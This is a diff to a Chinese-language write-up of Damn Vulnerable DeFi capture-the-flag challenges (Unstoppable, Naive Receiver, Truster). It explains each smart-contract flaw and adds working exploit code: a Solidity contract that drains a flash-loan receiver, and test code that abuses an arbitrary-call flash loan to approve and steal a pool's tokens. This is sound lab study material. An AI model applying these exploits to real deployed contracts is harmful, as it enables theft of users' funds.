@@ -21,10 +21,14 @@ $ yarn install
 
 ## 1. Unstoppable
 
-> make the vault stop offering flash loans
+> There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.
+>
+> To pass the challenge, make the vault stop offering flash loans.
+>
+> You start with 10 DVT tokens in balance.
 
 - ERC4626 实现 ERC20 作为股权代币，`asset` 为 Vault 管理的底层代币
-- `UnstoppableVault` 初始持有 $10^6$ DVT (ERC20) 和 $10^6$ oDVT (ERC4626)，`player` 初始持有 $10$ DVT
+- `UnstoppableVault` 初始持有 $10^6$ DVT (ERC20) 和 $10^6$ oDVT (ERC4626)
 
     ```js
     // unstoppable.challenge.js
@@ -61,7 +65,7 @@ $ yarn install
     }
     ```
 
-- 注意到 `convertToShares(totalSupply) != balanceBefore` 在使用依据 `totalSupply`(oDVT) 计算得到的 `shares` 和 `totalAssets()`(`UnstoppableVault` DVT 余额) 进行比较，尽管在初始情况下没有问题，但是... (⃔ *`ω´ * )⃕↝
+- 注意到 `convertToShares(totalSupply) != balanceBefore` 在使用依据 `totalSupply`(oDVT) 计算得到的 `shares` 和 `totalAssets()`(`UnstoppableVault` 的 DVT 余额) 进行比较，尽管在初始情况下没有问题，但是... (⃔ *`ω´ * )⃕↝
     - `totalSupply` 只能通过 `deposit` / `mint` 增加，而 `balanceBefore` 可通过 DVT 的 `transfer` 增加
     - 要将 `totalSupply` 转换成 `assets` 应使用 `convertToAssets`
 
@@ -130,3 +134,126 @@ $ yarn install
 
 - [ERC4626](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC4626)
 - [BigInt - JavaScript | MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt)
+
+## 2. Naive Receiver
+
+> There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.
+> 
+> A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.
+> 
+> Take all ETH out of the user’s contract. If possible, in a single transaction.
+
+`FlashLoanReceiver.onFlashLoan()` 没有检查闪电贷的发起者 uwu 只好「帮」`FlashLoanReceiver` 发起闪电贷来消耗余额啦 :D
+
+```js
+// FlashLoanReceiver.sol
+function onFlashLoan(
+    address,
+    address token,
+    uint256 amount,
+    uint256 fee,
+    bytes calldata
+) external returns (bytes32) {
+    assembly { // gas savings
+        if iszero(eq(sload(pool.slot), caller())) {
+            mstore(0x00, 0x48f5c3ed)
+            revert(0x1c, 0x04)
+        }
+    }
+    
+    if (token != ETH) revert UnsupportedCurrency();
+    
+    uint256 amountToBeRepaid;
+    unchecked {
+        amountToBeRepaid = amount + fee;
+    }
+
+    _executeActionDuringFlashLoan();
+
+    SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);
+
+    return keccak256("ERC3156FlashBorrower.onFlashLoan");
+}
+```
+
+### Exploit
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
+
+contract Hacker {
+    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
+
+    function exploit(address pool, address receiver) external {
+        for (uint8 i = 0; i < 10; i ++) {
+            IERC3156FlashLender(pool).flashLoan(
+                IERC3156FlashBorrower(receiver), // receiver
+                ETH,                             // token
+                1 ether,                         // amount
+                ""                               // data
+            );
+        }
+    }
+}
+```
+
+```js
+it('Execution', async function () {
+    let hacker = await (await ethers.getContractFactory("Hacker")).deploy();
+    await hacker.exploit(pool.address, receiver.address);
+});
+```
+
+## 3. Truster
+
+> The pool holds 1 million DVT tokens. You have nothing.
+>
+> To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.
+
+- `target.functionCall(data)` 可以以 `TrusterLenderPool` 的身份调用任意合约的任意函数
+
+    ```js
+    // TrusterLenderPool.sol
+    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
+        external
+        nonReentrant
+        returns (bool)
+    {
+        uint256 balanceBefore = token.balanceOf(address(this));
+
+        token.transfer(borrower, amount);
+        target.functionCall(data);
+
+        if (token.balanceOf(address(this)) < balanceBefore)
+            revert RepayFailed();
+
+        return true;
+    }
+    ```
+
+- 那就授权 `player` 使用 DVT 好了！(ΦˋωˊΦ)
+
+    ```js
+    it('Execution', async function () {
+        let abi = ["function approve(address spender, uint256 amount)"];
+        let iface = new ethers.utils.Interface(abi);
+        await pool.connect(player).flashLoan(
+            0,
+            player.address,
+            token.address,
+            iface.encodeFunctionData("approve", [
+                player.address,
+                TOKENS_IN_POOL
+            ]),
+        );
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+    });
+    ```
+
+### 参考资料
+
+- [encodeABI to get call data with encoded parameters of contract method · Issue #478 · ethers-io/ethers.js](https://github.com/ethers-io/ethers.js/issues/478#issuecomment-495814010)
